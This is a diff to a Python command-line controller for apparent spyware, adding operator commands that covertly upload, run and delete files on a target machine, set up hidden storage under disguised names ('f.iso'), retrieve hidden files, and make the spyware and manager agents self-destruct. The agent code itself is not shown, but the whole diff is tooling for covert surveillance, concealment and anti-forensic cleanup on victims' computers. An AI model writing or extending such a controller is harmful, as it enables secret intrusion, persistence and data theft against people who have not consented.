@@ -8,6 +8,7 @@ from icecream import ic
 from status import Status
 from random import randint
 import time
+import traceback
 
 USAGE_EXAMPLE = """-------Try This-------
 $ ops
@@ -24,13 +25,19 @@ def LOG(s: str):
     print(f"LOG: {s}")
 
 def print_res_str(res: tuple[Responce, bytes]):
+    if not res:
+        return
+    if isinstance(res, Responce):
+        print(res.status)
+        return
     if type(res[0]) == tuple:
         res = res[0]
     stat = res[0].status
     stri = res[1]
     if type(stri) == bytes:
         stri = stri.decode()
-    if stat != Status.SUCCSESS and stat != Status.DID_NOTHING or stri != '':
+    # if stat != Status.SUCCSESS and stat != Status.DID_NOTHING or stri != '':
+    if stat != Status.SUCCSESS or stri != '':
         print(f'Status: {stat}')
         print(f'String Response:\n---------------\n{stri}')    
 
@@ -80,7 +87,7 @@ def call_method(obj, method: str, *args):
             return getattr(obj, method)(*args)
         except Exception as e:
             print("OOPSIE: probably wrong arguments")
-            print(e)
+            ic(e)
     else:
         print(f"OOPSIE: Method {method} not found")
 
@@ -126,6 +133,7 @@ class UI:
         op = search_op(self.ctx.oper_dict, name)
         if not op:
             print("OOPSIE: Contraption not found")
+            return
         self.ctx.selected_operation = op
         LOG(f"Selected {name}")
 
@@ -198,12 +206,12 @@ class UI:
         """
         if not method:
             print_methods(self)
-            print('* For arguments with spaces wrap them in "')
+            print('@ For arguments with spaces wrap them in "')
         else:
             try:
                 print(getattr(self, method).__doc__)
             except Exception as e:
-                print(e)
+                ic(e)
 
     def bash(self, cmd: str):
         """
@@ -324,16 +332,26 @@ class UI:
                 targetPath, imagePath, mountPath
             )
         print_res_str(res)
-        LOG(f"Manager hider set")
-        LOG(f"Manager mount set")
+        # LOG(f"Manager hider set")
+        # LOG(f"Manager mount set")
         spy = self.ctx.selected_operation.spyAgent
         if not spy:
             return
         res = spy.hider_setup(targetPath, imagePath, mountPath)
         print_res_str(res)
-        LOG(f"Spyware hider set")
-        LOG(f"Spyware mount set")
+        LOG(f"Set Hider/s")
+        # LOG(f"Spyware mount set")
         return res
+
+    def umount(self):
+        return self.manager("unmountFS")
+
+    def die(self):
+        self.spyware("suicide")
+        # self.umount()
+        self.manager("suicide")
+        print("\nDone")
+        exit(0)
 
     def check_ready(self):
         if not self.is_op_active():
@@ -389,8 +407,13 @@ class UI:
         Returns:
             Status
         """
-        self.run(targetPath)
-        return self.delete(targetPath)
+        if self.check_ready():
+            res = self.ctx.selected_operation.managerAgent.hidden_action_without_upload(
+                FunCode.HIDDEN_RUN | FunCode.HIDDEN_DELETE,
+                targetPath,
+            )
+            print_res_str(res)
+            return res
 
     def persist(self, filePath):
         """
@@ -418,11 +441,15 @@ class UI:
         Returns:
             Status
         """
-        res = self.upload(homePath, targetPath)
-        print(f"DB: uprundel res test {res=}")
-        return self.rundel(targetPath)
+        if self.check_ready():
+            res = self.ctx.selected_operation.managerAgent.hidden_action_with_upload(
+                FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN | FunCode.HIDDEN_DELETE,
+                homePath, targetPath,
+            )
+            print_res_str(res)
+            return res
 
-    def list_hidden(self):
+    def listhid(self):
         """
         USAGE:
         list hidden files in target machine
@@ -497,15 +524,19 @@ class UI:
         self.uprun(spyHome, spyTarget)
         while not self.ctx.selected_operation.spyAgent:
             time.sleep(1)
-        self.setup(hiderTarg, 'img.iso', 'mont')
+        self.setup(hiderTarg, 'f.iso', 'f.mont')
         print('Done.')
 
-    def list_ops_names(self):
-        for op in self.ctx.oper_dict.values():
-            print(op)
+    def gethfile(self, filePath: str):
+        """
+        Get hidden file
 
-    def gethidden(self, fileName: str):
-        print(self.manager("retrieve_file", fileName))
+        Args:
+            filePath: path relative to hider (targetPath from other functions) 
+        Returns: 
+            status 
+        """
+        return self.manager("retrieve_file", filePath)
 
 
 if __name__ == "__main__":
